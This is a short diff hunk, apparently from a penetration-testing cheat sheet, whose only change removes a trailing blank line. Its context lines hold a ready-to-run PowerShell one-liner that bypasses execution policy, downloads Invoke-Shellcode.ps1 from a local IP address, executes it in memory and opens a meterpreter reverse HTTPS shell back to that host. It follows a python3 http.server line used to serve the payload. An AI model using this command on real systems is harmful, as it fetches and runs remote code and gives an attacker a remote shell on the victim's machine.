@@ -127,4 +127,3 @@ python3 -m http.server 80
 - Windows execute a remote file in memory
 powershell -nop -exec bypass
 IEX "(New-Object Net.WebClient).DownloadString('http://192.168.1.5/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.5 -Lport 443 -Force"
-
